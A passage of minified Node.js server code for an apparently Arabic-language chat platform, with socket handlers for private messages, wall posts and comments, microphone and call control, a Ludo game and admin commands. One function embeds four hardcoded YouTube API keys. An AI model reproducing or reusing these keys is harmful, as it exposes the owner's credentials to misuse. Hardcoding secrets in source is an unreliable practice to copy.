    }, o.prototype.canOpenDisabledPrivate = function(e) {
        return !(e.isPrivateDisabled && !e.privateUsers.includes(this.user.id) && !this.user.has("open_private") && !e.privateUsers.includes(this.user.id) && (this.handler(r.enc("الخاص مغلق")), 1))
    }, o.prototype.findUser = function(e) {
        return this.store.users.filter(t => t.id == e)[0]
    }, o.prototype.isValidType = function(e) {
        return ["text", "photo", "sound", "video", "youtube"].includes(e)
    }, o.prototype.register = function(e, t, s) {
        const r = this;
        return new Promise((i, o) => {
            r.store.db.query("INSERT INTO private_messages (byRealName, byNickName, toRealName, toNickName, msg, msgType, created_at, updated_at) VALUES (?,?,?,?,?,?,?,?)", [r.user.name, r.user.getUsername(), e.name, e.getUsername(), t, s, new Date, new Date], (e, t) => {
                e && o(e), i(t)
            })
        })
    }, o.prototype.isUserMuted = function() {
        return !!this.user.isMuted || this.store.mutedIps.indexOf(this.user.ip) >= 0 || this.store.mutedDevices.indexOf(this.user.device) >= 0
    }, e.exports = o
}, function(e, t, s) {
    const r = s(0),
        i = s(4);

    function o(e, t, s, i) {
        switch (this.socket = t, this.user = s, this.store = i, this.handler = e.handler, r.check(i, t), e.type) {
            case "WALL_GET_POSTS":
                return this.getPosts(e.data);
            case "WALL_YOUTUBE_SEARCH":
                return this.youtubeSearch(e.data);
            case "WALL_GET_POST_COMMENTS":
                return this.getPostComments(e.data);
            case "WALL_BEFORE_SEND_MEDIA":
                return this.onBeforeSendMedia(e.data);
            case "WALL_ADD_POST":
                return this.add(e.data);
            case "WALL_LIKE_POST":
                return this.like(e.data);
            case "WALL_REMOVE_POST":
                return this.remove(e.data);
            case "ADD_WALL_POST_COMMENT":
                return this.addComment(e.data);
            case "WALL_POST_COMMENT_LIKE":
                return this.likeComment(e.data);
            case "WALL_POST_COMMENT_REMOVE":
                return this.removeComment(e.data);
            case "WALL_CREATOR_GET_POSTS":
                return this.getCreatorPosts(e.data);
            default:
                return null
        }
    }
    o.prototype.youtubeSearch = function(e) {
        if (e && e.query) {
            const t = "https://www.googleapis.com/youtube/v3/search?part=snippet&key=" + this.getYoutubeAPIKey() + "&type=video&q=" + encodeURI(e.query);
            i.get(t).then(e => {
                if (e.data && e.data.items && e.data.items.length) {
                    let t = e.data.items[0],
                        s = t.id.videoId,
                        i = t.snippet.title,
                        o = t.snippet.thumbnails.medium;
                    this.handler(r.enc({
                        error: !1,
                        videoId: s,
                        title: i,
                        thumbnail: o
                    }))
                }
            }).catch(e => {
                console.log(e.response), this.handler(r.enc({
                    error: !0,
                    message: "حصل خطأ أثناء القيام بالعملية"
                }))
            })
        }
    }, o.prototype.getPosts = function(e) {
        this.store.wall.all(this.store.settings.get("wall_msg_count", this.user.getDomain())).then(e => {
            this.handler(r.enc(e))
        }).catch(e => {})
    }, o.prototype.getPostComments = function(e) {
        this.store.wall.getPostComments(e.post_id, 100).then(e => {
            this.handler(r.enc(e))
        }).catch(e => {})
    }, o.prototype.onBeforeSendMedia = function(e) {
        const t = this.store.settings.get("required_likes_wall", this.user.getDomain());
        if (this.user.getReputation() < t) return this.handler(r.enc("يجب أن تتوفر على " + t + " إعجاب حتى تتمكن من القيام بهذه العملية"));
        this.user.can("wall_interval", this.handler, !0) && this.user.generateUploadHash().then(e => {
            this.handler(r.enc({
                error: !1,
                user_id: this.user.reg_id,
                hash: e
            }))
        }).catch(e => {})
    }, o.prototype.add = function(e) {
        const t = this.store.settings.get("required_likes_wall", this.user.getDomain());
        if (this.user.getReputation() < t) return this.handler(r.enc("يجب أن تتوفر على " + t + " إعجاب حتى تتمكن من القيام بهذه العملية"));
        if (this.isUserMuted()) return this.handler(r.enc("لا يمكنك النشر على الحائط حاليا, الرجاء إعادة المحاولة لاحقا"));
        if (this.isValidType(e.type) && e.body && !r.isXSS(e.body) && !this.store.wordsFilter.check(e.body, this.user, this.handler) && this.user.can("wall_interval", this.handler)) {
            if ("text" == e.type) {
                e.body = e.body.substr(0, 200);
                const t = r.getYoutubeId(e.body);
                t && (e.type = "youtube", e.body = t)
            }
            this.store.wall.add(e, this.user.reg_id).then(e => {
                e.user = this.user.parse(), this.store.io.emit("res", r.enc({
                    type: "POST_ADDED",
                    data: e
                })), this.handler(r.enc({
                    error: !1
                })), this.register(e, "add").catch(), this.user.wallPoints = this.user.wallPoints + 1, this.user.save()
            }).catch(e => {})
        }
    }, o.prototype.addComment = function(e) {
        if (this.user.isGuest()) return this.handler(r.enc("يجب أن تتوفر على عضوية حتى تتمكن من التعليق على المنشورات"));
        const t = this.store.settings.get("required_likes_wall", this.user.getDomain());
        if (this.user.getReputation() < t) return this.handler(r.enc("يجب أن تتوفر على " + t + " إعجاب حتى تتمكن من القيام بهذه العملية"));
        if (this.isUserMuted()) return this.handler(r.enc("لا يمكنك التعليق على الحائط حاليا, الرجاء إعادة المحاولة لاحقا"));
        if (!e.text || r.isXSS(e.text)) return;
        if (this.store.wordsFilter.check(e.text, this.user, this.handler)) return;
        let s = e.post_id;
        this.store.wall.addComment(e, this.user.reg_id).then(e => {
            e.user = this.user.parse(), this.store.io.emit("res", r.enc({
                type: "POST_COMMENT_ADDED",
                data: {
                    post_id: s,
                    comment: e
                }
            })), this.handler(r.enc({
                error: !1
            }));
            const t = this.store.users.filter(t => t.reg_id == e.postOwnerId)[0];
            if (t && t.socket && t.id != this.user.id) {
                const s = {
                    user: this.user.parse(),
                    commentId: e.id,
                    comment: e.comment,
                    postId: e.postId
                };
                t.socket.emit("res", r.enc({
                    type: "POST_COMMENTED",
                    data: s
                }))
            }
        }).catch(e => {})
    }, o.prototype.likeComment = function(e) {
        const t = parseInt(e.id);
        isNaN(t) || this.user.likedPostComments.includes(t) || this.store.wall.likeComment(t).then(e => {
            this.user.likedPostComments.push(t);
            const s = this.store.users.filter(t => t.reg_id == e.userId)[0];
            if (!this.isUserMuted() && s && s.socket && s.id != this.user.id) {
                const i = {
                    user: this.user.parse(),
                    commentId: t,
                    comment: e.comment
                };
                s.socket.emit("res", r.enc({
                    type: "POST_COMMENT_LIKED",
                    data: i
                }))
            }
            this.handler(r.enc({
                error: !1
            }))
        }).catch(e => {})
    }, o.prototype.like = function(e) {
        const t = parseInt(e.id);
        isNaN(t) || this.user.likedPosts.includes(t) || this.store.wall.like(t).then(e => {
            this.user.likedPosts.push(t), this.store.io.emit("res", r.enc({
                type: "POST_UPDATED",
                data: {
                    id: t,
                    updates: {
                        likes: e.likes
                    }
                }
            }));
            const s = this.store.users.filter(t => t.reg_id == e.userId)[0];
            if (!this.isUserMuted() && s && s.socket) {
                const e = {
                    user: this.user.parse(),
                    postId: t
                };
                s.socket.emit("res", r.enc({
                    type: "POST_LIKED",
                    data: e
                }))
            }
        }).catch(e => {})
    }, o.prototype.remove = function(e) {
        const t = parseInt(e.id);
        isNaN(t) || this.store.wall.get(t).then(e => {
            (e == this.user.reg_id || this.user.can("wall_remove", this.handler)) && this.store.wall.remove(t).then(e => {
                this.store.io.emit("res", r.enc({
                    type: "POST_REMOVED",
                    data: {
                        id: t
                    }
                }));
                const s = this.store.users.filter(t => t.reg_id == e.userId)[0];
                if (!this.isUserMuted() && s && s.socket) {
                    const e = {
                        user: this.user.parse(),
                        postId: t
                    };
                    s.socket.emit("res", r.enc({
                        type: "YOUR_POST_IS_REMOVED",
                        data: e
                    }))
                }
                this.store.ordersReg.wallRemove(this.user, null), this.register({
                    body: e.body,
                    type: e.type
                }, "remove").catch()
            }).catch(e => {})
        }).catch(e => {})
    }, o.prototype.removeComment = function(e) {
        const t = parseInt(e.id),
            s = parseInt(e.postId);
        isNaN(t) || isNaN(s) || this.store.wall.get(s).then(e => {
            (e == this.user.reg_id || this.user.can("wall_remove", this.handler)) && this.store.wall.removeComment(t, s).then(e => {
                this.handler(r.enc({
                    error: !1
                })), this.store.io.emit("res", r.enc({
                    type: "POST_COMMENT_DELETED",
                    data: {
                        post_id: e.postId,
                        id: t
                    }
                }))
            }).catch(e => {})
        }).catch(e => {})
    }, o.prototype.getCreatorPosts = function(e) {
        this.store.wall.getCreatorPosts().then(e => {
            this.handler(r.enc(e))
        }).catch(e => {
            console.log("getCreatorPosts.err", e)
        })
    }, o.prototype.isValidType = function(e) {
        return ["text", "photo", "sound", "video", "youtube"].includes(e)
    }, o.prototype.register = function(e, t) {
        const s = this;
        return new Promise((r, i) => {
            s.store.db.query("INSERT INTO wallReg (byRealName, byNickName, msg, msgType, actionType, created_at, updated_at) VALUES (?,?,?,?,?,?,?)", [s.user.name, s.user.getUsername(), e.body, e.type, t, new Date, new Date], (e, t) => {
                e && i(e), r(t)
            })
        })
    }, o.prototype.isUserMuted = function() {
        return !!this.user.isMuted || this.store.mutedIps.indexOf(this.user.ip) >= 0 || this.store.mutedDevices.indexOf(this.user.device) >= 0
    }, o.prototype.getYoutubeAPIKey = function() {
        const e = ["AIzaSyAwsHelm1o9jlQ-WSS5aERXckneAS8WyOE", "AIzaSyCeIZpScLqvQJ-L9YaXAd6Oasx_MJ8mN9k", "AIzaSyB8NZ_dSkWSXhgIArfL6cxNyiHpfaptscY", "AIzaSyARyXETM16ht_61J67wvcO718EoUVHDJjk"];
        return e[Math.floor(Math.random() * e.length)]
    }, e.exports = o
}, function(e, t, s) {
    const r = s(0);

    function i(e, t, s, i) {
        switch (this.socket = t, this.user = s, this.store = i, this.handler = e.handler, r.check(i, t), e.type) {
            case "REQUEST_MIC":
                return this.requestMic(e.data);
            case "STOP_SOUND":
                return this.stopSound(e.data);
            default:
                return null
        }
    }
    i.prototype.requestMic = function(e) {
        e && "boolean" != typeof e.on || (e.on ? this.store.radio.requestMic(this.user) : this.store.radio.unRequestMic(this.user))
    }, i.prototype.stopSound = function(e) {
        if (e && "boolean" != typeof e.on) return;
        this.user.micStatus.soundOff = e.on;
        const t = {
            micStatus: this.user.micStatus
        };
        this.store.io.emit("res", r.enc({
            type: "USER_UPDATED",
            data: {
                id: this.user.id,
                reg_id: this.user.reg_id,
                updates: t
            }
        }))
    }, e.exports = i
}, function(e, t, s) {
    const r = s(0),
        i = s(6);

    function o(e, t, s, i) {
        switch (this.socket = t, this.user = s, this.store = i, this.handler = e.handler, r.check(i, t), e.type) {
            case "CALL_REQUEST":
                return this.callRequest(e.data);
            case "CALL_REQUEST_CANCEL":
                return this.callRequestCancel(e.data);
            case "CALL_REQUEST_ACCEPT":
                return this.callRequestAccept(e.data);
            default:
                return null
        }
    }
    o.prototype.callRequest = function(e) {
        const t = this.findUser(e.id);
        if (!t) return this.handler(r.enc("هذا المستخدم غير متواجد الآن"));
        if (this.user.callStatus != i.READY) return this.handler(r.enc({
            user: {},
            message: "not ready"
        }));
        if (t.callStatus == i.TALKING) return this.handler(r.enc({
            user: {},
            message: "هذا المستخم مشغول حاليا,الرجاء إعادة المحاولة لاحقا"
        }));
        if (t.callStatus == i.RIGHNING) return this.handler(r.enc({
            user: {},
            message: "لا يمكن إجراء هذه المكالمة الآن, الرجاء إعادة المحاولة لاحقا"
        }));
        if (t.callStatus == i.CALLING) return this.handler(r.enc({
            user: {},
            message: "لا يمكن إجراء هذه المكالمة الآن, الرجاء إعادة المحاولة لاحقا"
        }));
        if (t.callStatus == i.OFFLINE) return this.handler(r.enc({
            user: {},
            message: "لا يمكن إجراء هذه المكالمة الآن, الرجاء إعادة المحاولة لاحقا"
        }));
        if (t.callStatus == i.READY) {
            const e = {
                id: this.user.id,
                username: this.user.getUsername(),
                avatar: this.user.getAvatar()
            };
            t.callStatus = i.RIGHNING, t.socket.emit("res", r.enc({
                type: "CALL_REQUESTED",
                data: {
                    caller: e
                }
            })), t.callUserId = this.user.id;
            const s = {
                id: t.id,
                username: t.getUsername(),
                avatar: t.getAvatar()
            };
            return this.user.callStatus = i.CALLING, this.handler(r.enc({
                user: s,
                message: "rigning"
            }))
        }
    }, o.prototype.callRequestCancel = function(e) {
        const t = this.findUser(e.id);
        if (t) return t.socket.emit("res", r.enc({
            type: "CALL_REQUEST_CANCELLED",
            data: {}
        })), this.user.callStatus = i.READY, t.callStatus = i.READY, t.callUserId = null, this.user.callUserId = null, this.handler()
    }, o.prototype.callRequestAccept = function(e) {
        const t = this.findUser(e.id);
        if (!t) return;
        const s = {
            id: this.user.id,
            username: this.user.getUsername(),
            avatar: this.user.getAvatar()
        };
        return t.socket.emit("res", r.enc({
            type: "CALL_REQUEST_ACCEPTED",
            data: {
                caller: s
            }
        })), this.user.callStatus = i.TALKING, t.callStatus = i.TALKING, this.user.callUserId = t.id, t.callUserId = this.user.id, this.handler(r.enc(t.id))
    }, o.prototype.findUser = function(e) {
        return this.store.users.filter(t => t.id == e)[0] || this.store.usersReg.filter(t => t.id == e)[0]
    }, e.exports = o
}, function(e, t, s) {
    const r = s(0);

    function i(e, t, s, i) {
        switch (this.socket = t, this.user = s, this.store = i, this.handler = e.handler, r.check(i, t), e.type) {
            case "MIC_REQUEST":
                return this.requestMic(e.data);
            case "MIC_LEAVE":
                return this.leaveMic(e.data);
            case "MIC_PULL":
                return this.pullMic(e.data);
            case "MIC_MUTE":
                return this.muteMic(e.data);
            case "MIC_LOG_ERROR":
                return this.logError(e.data);
            case "MIC_REQUEST_RECALL":
                return this.requestRecall(e.data);
            default:
                return null
        }
    }
    i.prototype.requestMic = function(e) {
        const t = this.store.settings.get("required_likes_mic", this.user.getDomain());
        return this.user.getReputation() < t ? this.handler(r.enc("يجب أن تتوفر على " + t + " إعجاب حتى تتمكن من القيام بهذه العملية")) : this.user.room.micUsers.filter(e => e.user_id == this.user.id)[0] || this.user.room.micUsers.filter(t => t.micId == e.micId)[0] ? this.handler() : (this.user.room.micUsers.push({
            micId: e.micId,
            user_id: this.user.id
        }), void this.store.users.forEach(t => {
            t.socket && t.socket.connected && this.user.room.users.indexOf(t.id) >= 0 && t.socket.emit("res", r.enc({
                type: "MIC_NEW_SPEAKER",
                data: {
                    user: this.user.parse(),
                    micId: e.micId
                }
            }))
        }))
    }, i.prototype.leaveMic = function(e) {
        return this.user.room.micUsers.filter(e => e.user_id == this.user.id)[0] && this.user.room.micUsers.filter(t => t.micId == e.micId)[0] ? (this.user.room.micUsers = this.user.room.micUsers.filter(e => e.user_id != this.user.id), void this.store.users.forEach(t => {
            t.socket && t.socket.connected && this.user.room.users.indexOf(t.id) >= 0 && t.socket.emit("res", r.enc({
                type: "MIC_SPEAKER_LEAVED",
                data: {
                    user: this.user.parse(),
                    micId: e.micId
                }
            }))
        })) : this.handler()
    }, i.prototype.pullMic = function(e) {
        let t = this.store.users.filter(t => t.id == e.userId)[0];
        return t && this.user.room.micUsers.filter(e => e.user_id == t.id)[0] && this.user.room.micUsers.filter(t => t.micId == e.micId)[0] ? (this.user.room.micUsers = this.user.room.micUsers.filter(e => e.user_id != t.id), void this.store.users.forEach(s => {
            s.socket && s.socket.connected && this.user.room.users.indexOf(s.id) >= 0 && s.socket.emit("res", r.enc({
                type: "MIC_SPEAKER_LEAVED",
                data: {
                    acter: this.user.parse(),
                    user: t.parse(),
                    micId: e.micId
                }
            }))
        })) : this.handler()
    }, i.prototype.muteMic = function(e) {
        let t = this.store.users.filter(t => t.id == e.userId)[0];
        return t && this.user.room.micUsers.filter(e => e.user_id == t.id)[0] && this.user.room.micUsers.filter(t => t.micId == e.micId)[0] ? (t.isMicMuted = e.muted, void this.store.users.forEach(s => {
            s.socket && s.socket.connected && this.user.room.users.indexOf(s.id) >= 0 && s.socket.emit("res", r.enc({
                type: "MIC_SPEAKER_MUTED",
                data: {
                    acter: this.user.parse(),
                    user: t.parse(),
                    micId: e.micId,
                    muted: e.muted
                }
            }))
        })) : this.handler()
    }, i.prototype.logError = function(e) {
        if (e && e.error) {
            const t = new Date;
            this.store.db.query("INSERT INTO logs (`name`, `error`, created_at, updated_at) VALUES (?, ?, ?, ?)", [this.user.name, e.error, t, t], (e, t) => {})
        }
    }, i.prototype.requestRecall = function(e) {
        let t = this.store.users.filter(t => t.id == e.peerID)[0];
        t && t.socket && t.socket.connected && t.socket.emit("res", r.enc({
            type: "MIC_RECALL_USER",
            data: {
                user: this.user.parse()
            }
        }))
    }, e.exports = i
}, function(e, t, s) {
    s(4);
    const r = s(0),
        i = (s(5), s(10));

    function o(e, t, s, i) {
        switch (this.socket = t, this.user = s, this.store = i, this.handler = e.handler, r.check(i, t), e.type) {
            case "BOT_BRB_OPEN":
                return this.open(e.data);
            case "BOT_BRB_CREATE":
                return this.create(e.data);
            case "BOT_BRB_START":
                return this.start(e.data);
            case "BOT_BRB_PAUSE":
                return this.pause(e.data);
            case "BOT_BRB_STOP":
                return this.stop(e.data);
            case "BOT_BRB_UPDATE":
                return this.update(e.data);
            default:
                return null
        }
    }
    s(6), o.prototype.open = function(e) {
        if (e && e.room_id && this.store.rooms.get(e.room_id)) {
            let t = this.store.bots_brb.filter(t => t.room_id == e.room_id)[0];
            if (t) return this.handler(r.enc({
                bot: t.parse()
            }))
        }
        return this.handler(r.enc({
            bot: null
        }))
    }, o.prototype.create = function(e) {
        if (e && e.room_id && e.num_rounds && this.store.rooms.get(e.room_id)) {
            var t = this.store.bots_brb.filter(t => t.room_id == e.room_id)[0];
            return t ? t.start() : ((t = new i(this.store)).num_rounds = e.num_rounds, t.excpel = e.excpel, t.speed = e.speed, t.room_id = e.room_id, t.created_by = this.user.id, t.start(), this.store.bots_brb.push(t)), this.handler(r.enc({
                bot: t.parse()
            }))
        }
        return this.handler(r.enc({
            bot: null
        }))
    }, o.prototype.start = function(e) {
        if (e && e.room_id && this.store.rooms.get(e.room_id)) {
            let t = this.store.bots_brb.filter(t => t.room_id == e.room_id)[0];
            t && t.start()
        }
    }, o.prototype.pause = function(e) {
        if (e && e.room_id && this.store.rooms.get(e.room_id)) {
            let t = this.store.bots_brb.filter(t => t.room_id == e.room_id)[0];
            if (t) return t.pause(), this.handler(r.enc({
                bot: t.parse()
            }))
        }
        return this.handler(r.enc({
            bot: null
        }))
    }, o.prototype.stop = function(e) {
        if (e && e.room_id && this.store.rooms.get(e.room_id)) {
            let t = this.store.bots_brb.filter(t => t.room_id == e.room_id)[0];
            if (t) return t.stop(), this.handler(r.enc({
                bot: t.parse()
            }))
        }
        return this.handler(r.enc({
            bot: null
        }))
    }, o.prototype.update = function(e) {
        if (e && e.room_id && this.store.rooms.get(e.room_id)) {
            let t = this.store.bots_brb.filter(t => t.room_id == e.room_id)[0];
            if (t) return t.update(e), this.handler(r.enc({
                bot: t.parse()
            }))
        }
        return this.handler(r.enc({
            bot: null
        }))
    }, e.exports = o
}, function(e, t, s) {
    const {
        indexOf: r
    } = s(35), i = s(0), o = s(3);

    function n(e, t, s, r) {
        switch (this.socket = t, this.user = s, this.store = r, this.handler = e.handler, i.check(r, t), e.type) {
            case "YOUCAM_LUDO_REQUEST":
                return this.youcamLudoRequest(e.data);
            case "YOUCAM_LUDO_REQUEST_ACCEPT":
                return this.youcamLudoRequestAccept(e.data);
            case "YOUCAM_LUDO_REQUEST_REFUSE":
                return this.youcamLudoRequestRefuse(e.data);
            case "YOUCAM_LUDO_START_GAME":
                return this.youcamLudoStartGame(e.data);
            case "YOUCAM_LUDO_DICE_CLICKED":
                return this.youcamLudoDiceClicked(e.data);
            case "YOUCAM_LUDO_PLAYER_CLICKED":
                return this.youcamLudoPlayerClicked(e.data);
            case "YOUCAM_LUDO_UPDATE_TURN":
                return this.youcamLudoUpdateTurn(e.data);
            case "YOUCAM_LUDO_EXIT_GAME":
                return this.youcamLudoExitGame(e.data);
            case "YOUCAM_LUDO_END_GAME":
                return this.youcamLudoEndGame(e.data);
            case "YOUCAM_LUDO_WIN_GAME":
                return this.youcamLudoWinGame(e.data);
            case "YOUCAM_LUDO_END_PUBLIC_GAME":
                return this.youcamLudoEndPublicGame(e.data);
            case "YOUCAM_LUDO_UPDATE_GAME_STATE":
                return this.youcamLudoUpdateGameState(e.data);
            case "YOUCAM_LUDO_SET_TURN":
                return this.youcamLudoSetTurn(e.data);
            default:
                return null
        }
    }
    n.prototype.youcamLudoRequest = function(e) {
        const t = this.findUser(e.user);
        if (t && !t.isPlaying && !t.isVirtual) return t.socket.emit("res", i.enc({
            type: "YOUCAM_LUDO_REQUESTED",
            data: {
                user: this.user.parse(),
                color: e.color
            }
        })), this.handler(i.enc("waiting"));
        this.user.socket.emit("res", i.enc({
            type: "YOUCAM_LUDO_REQUEST_REFUSED",
            data: {
                user: t.parse(),
                color: e.color
            }
        }))
    }, n.prototype.youcamLudoRequestAccept = function(e) {
        const t = this.findUser(e.id);
        return t ? (t.socket.emit("res", i.enc({
            type: "YOUCAM_LUDO_REQUEST_ACCEPTED",
            data: {
                user: this.user.parse(),
                color: e.color
            }
        })), this.handler(i.enc({}))) : this.handler(i.enc({}))
    }, n.prototype.youcamLudoRequestRefuse = function(e) {
        const t = this.findUser(e.id);
        return t ? (t.socket.emit("res", i.enc({
            type: "YOUCAM_LUDO_REQUEST_REFUSED",
            data: {
                user: this.user.parse(),
                color: e.color
            }
        })), this.handler(i.enc({}))) : this.handler(i.enc({}))
    }, n.prototype.youcamLudoStartGame = function(e) {
        const t = o();
        if (this.user.isPlaying = !0, this.user.ludoGame = t, e.isPublic) {
            if (this.user.room.ludoGame) return this.handler(i.enc("لا يمكن لعب لعبتين في العام في نفس الوقت"));
            this.user.room.users.forEach(s => {
                var r = this.findUser(s);
                if (r && !r.isPlaying) {
                    let o = e.players.filter(e => e.user_id == s)[0];
                    o ? (r.isPlaying = !0, r.ludoGame = t, r.socket.emit("res", i.enc({
                        type: "YOUCAM_LUDO_START_GAME",
                        data: {
                            turn: e.turn,
                            color: o.color,
                            players: e.players
                        }
                    })), this.store.io.emit("res", i.enc({
                        type: "USER_UPDATED",
                        data: {
                            id: r.id,
                            reg_id: r.reg_id,
                            updates: {
                                isPlaying: !0
                            }
                        }
                    }))) : r.socket.emit("res", i.enc({
                        type: "YOUCAM_LUDO_START_GAME",
                        data: {
                            turn: e.turn,
                            color: null,
                            players: e.players
                        }
                    }))
                }
            }), this.user.room.ludoGame = t, this.user.room.ludoGameState.players = e.players, this.user.room.ludoGameState.currentTurn = e.turn
        } else
            for (var s in e.players) {
                var r = e.players[s],
                    n = this.findUser(r.user_id);
                n && (n.isPlaying = !0, n.ludoGame = t, n.socket.emit("res", i.enc({
                    type: "YOUCAM_LUDO_START_GAME",
                    data: {
                        turn: e.turn,
                        color: r.color,
                        players: e.players
                    }
                })), this.store.io.emit("res", i.enc({
                    type: "USER_UPDATED",
                    data: {
                        id: n.id,
                        reg_id: n.reg_id,
                        updates: {
                            isPlaying: !0
                        }
                    }
                })))
            }
        return this.handler(i.enc({}))
    }, n.prototype.youcamLudoDiceClicked = function(e) {
        if (this.user.room && this.user.room.ludoGame && this.user.room.ludoGame == this.user.ludoGame) this.user.room.users.forEach(t => {
            var s = this.findUser(t);
            s && (s.ludoGame && s.ludoGame != this.user.room.ludoGame || s.socket.emit("res", i.enc({
                type: "YOUCAM_LUDO_DICE_CLICKED",
                data: {
                    value: e.value,
                    color: e.color
                }
            })))
        });
        else
            for (var t in e.players) {
                var s = e.players[t],
                    r = this.findUser(s.user_id);
                r && r.socket.emit("res", i.enc({
                    type: "YOUCAM_LUDO_DICE_CLICKED",
                    data: {
                        value: e.value,
                        color: e.color
                    }
                }))
            }
    }, n.prototype.youcamLudoPlayerClicked = function(e) {
        if (this.user.room && this.user.room.ludoGame && this.user.room.ludoGame == this.user.ludoGame) this.user.room.users.forEach(t => {
            var s = this.findUser(t);
            s && (s.ludoGame && s.ludoGame != this.user.room.ludoGame || s.socket.emit("res", i.enc({
                type: "YOUCAM_LUDO_PLAYER_CLICKED",
                data: {
                    value: e.value,
                    color: e.color,
                    id: e.id
                }
            })))
        });
        else
            for (var t in e.players) {
                var s = e.players[t],
                    r = this.findUser(s.user_id);
                r && r.socket.emit("res", i.enc({
                    type: "YOUCAM_LUDO_PLAYER_CLICKED",
                    data: {
                        value: e.value,
                        color: e.color,
                        id: e.id
                    }
                }))
            }
    }, n.prototype.youcamLudoUpdateTurn = function(e) {
        if (this.user.room && this.user.room.ludoGame && this.user.room.ludoGame == this.user.ludoGame) this.user.room.ludoGameState.currentTurn = e.currentTurn, this.user.room.users.forEach(t => {
            var s = this.findUser(t);
            s && (s.ludoGame && s.ludoGame != this.user.room.ludoGame || s.socket.emit("res", i.enc({
                type: "YOUCAM_LUDO_UPDATE_TURN",
                data: {
                    value: e.value,
                    color: e.color
                }
            })))
        });
        else
            for (var t in e.players) {
                var s = e.players[t],
                    r = this.findUser(s.user_id);
                r && r.socket.emit("res", i.enc({
                    type: "YOUCAM_LUDO_UPDATE_TURN",
                    data: {
                        value: e.value,
                        color: e.color
                    }
                }))
            }
    }, n.prototype.youcamLudoExitGame = function(e) {
        if (this.user.room && this.user.room.ludoGame && this.user.room.ludoGame == this.user.ludoGame) this.user.room.users.forEach(t => {
            var s = this.findUser(t);
            s && (s.ludoGame && s.ludoGame != this.user.room.ludoGame || s.socket.emit("res", i.enc({
                type: "YOUCAM_LUDO_EXIT_GAME",
                data: {
                    color: e.color
                }
            })))
        });
        else
            for (var t in e.players) {
                var s = e.players[t],
                    r = this.findUser(s.user_id);
                r && r.socket.emit("res", i.enc({
                    type: "YOUCAM_LUDO_EXIT_GAME",
                    data: {
                        color: e.color
                    }
                }))
            }
        this.user.isPlaying = !1, this.user.ludoGame = null, this.store.io.emit("res", i.enc({
            type: "USER_UPDATED",
            data: {
                id: this.user.id,
                reg_id: this.user.reg_id,
                updates: {
                    isPlaying: !1
                }
            }
        }))
    }, n.prototype.youcamLudoEndGame = function(e) {
        if (this.user.room && this.user.room.ludoGame && this.user.room.ludoGame == this.user.ludoGame) this.user.room.users.forEach(t => {
            var s = this.findUser(t);
            s && (s.ludoGame && s.ludoGame != this.user.room.ludoGame || (s.socket.emit("res", i.enc({
                type: "YOUCAM_LUDO_END_GAME",
                data: {
                    color: e.color
                }
            })), s.ludoGame && (s.isPlaying = !1, s.ludoGame = null, this.store.io.emit("res", i.enc({
                type: "USER_UPDATED",
                data: {
                    id: s.id,
                    reg_id: s.reg_id,
                    updates: {
                        isPlaying: !1
                    }
                }
            })))))
        });
        else
            for (var t in e.players) {
                var s = e.players[t],
                    r = this.findUser(s.user_id);
                r && (r.socket.emit("res", i.enc({
                    type: "YOUCAM_LUDO_END_GAME",
                    data: {
                        color: e.color
                    }
                })), r.isPlaying = !1, r.ludoGame = null, this.store.io.emit("res", i.enc({
                    type: "USER_UPDATED",
                    data: {
                        id: r.id,
                        reg_id: r.reg_id,
                        updates: {
                            isPlaying: !1
                        }
                    }
                })))
            }
    }, n.prototype.youcamLudoWinGame = function(e) {
        e.gameEnded && this.user.room && this.user.room.ludoGame && this.user.room.ludoGame == this.user.ludoGame && (this.user.room.ludoGame = null, this.user.room.ludoGameState = {}), this.user.isPlaying = !1, this.user.ludoGame = null
    }, n.prototype.youcamLudoEndPublicGame = function(e) {
        this.user.room && this.user.room.ludoGame && this.user.room.ludoGame == this.user.ludoGame && (this.user.room.ludoGame = null, this.user.room.ludoGameState = {})
    }, n.prototype.youcamLudoUpdateGameState = function(e) {
        e.state && this.user.room && this.user.room.ludoGame && this.user.room.ludoGame == this.user.ludoGame && (this.user.room.ludoGameState.players = e.state, this.user.room.ludoGameState.currentTurn = e.currentTurn)
    }, n.prototype.youcamLudoSetTurn = function(e) {
        e.currentTurn && this.user.room && this.user.room.ludoGame && this.user.room.ludoGame == this.user.ludoGame && (this.user.room.ludoGameState.currentTurn = e.currentTurn)
    }, n.prototype.findUser = function(e) {
        return this.store.users.filter(t => t.id == e && t.socket && t.socket.connected)[0]
    }, e.exports = n
}, function(e, t) {
    e.exports = require("lodash")
}, function(e, t, s) {
    const r = s(0),
        i = s(1);

    function o(e, t, s) {
        if (this.socket = t, this.store = s, this.handler = e.handler, r.check(s, t), this.isValidToken(e.data.token)) switch (e.type) {
            case "ADMIN_ROOM_CREATE":
                return this.createRoom(e.data);
            case "ADMIN_ROOM_UPDATE":
                return this.updateRooms(e.data);
            case "ADMIN_ROOM_UPDATE_FLAG":
                return this.updateRoomFlag(e.data);
            case "ADMIN_ROOM_DELETE":
                return this.deleteRoom(e.data);
            case "ADMIN_ROOMS_SET_DEFAULT_FLAG":
                return this.setDefaultRoomFlag(e.data);
            case "ADMIN_BANNEDS_CLEAR":
                return this.clearBanneds(e.data);
            case "ADMIN_BANNEDS_ADD":
                return this.banUser(e.data);
            case "ADMIN_MUTEDS_CLEAR":
                return this.clearMuteds(e.data);
            case "ADMIN_MUTEDS_ADD":
                return this.muteUser(e.data);
            case "ADMIN_ROLES_RESET":
                return this.resetRoles(e.data);
            case "ADMIN_ROLE_CHANGE_ICON":
                return this.changeRoleIcon(e.data);
            case "ADMIN_ROLE_REMOVE_ICON":
                return this.removeRoleIcon(e.data);
            case "ADMIN_PERMISSIONS_RESET":
                return this.resetPermissions(e.data);
            case "ADMIN_WORDS_ADD":
                return this.filterAddWord(e.data);
            case "ADMIN_WORDS_UPDATE_TYPE":
                return this.filterUpdateWordType(e.data);
            case "ADMIN_WORDS_REMOVE":
                return this.filterRemoveWord(e.data);
            case "ADMIN_WORDS_RESET":
                return this.filterResetWords(e.data);
            case "ADMIN_USERS_UPDATE_ROLE":
                return this.usersUpdateRole(e.data);
            case "ADMIN_USERS_SET_DEFAULT_AVATAR":
                return this.usersSetDefaultAvatar(e.data);
            case "ADMIN_VIRTUAL_USERS_ADD":
                return this.addVirtualUser(e.data);
            case "ADMIN_VIRTUAL_USERS_DELETE":
                return this.deleteVirtualUser(e.data);
            case "ADMIN_VIRTUAL_USERS_LOGOUT":
                return this.logoutVirtualUser(e.data);
            case "ADMIN_RESET_FACES":
                return this.resetFaces(e.data);
            case "ADMIN_RESET_GIFTS":
                return this.resetGifts(e.data);
            case "ADMIN_SELF_MESSAGES_ADD":
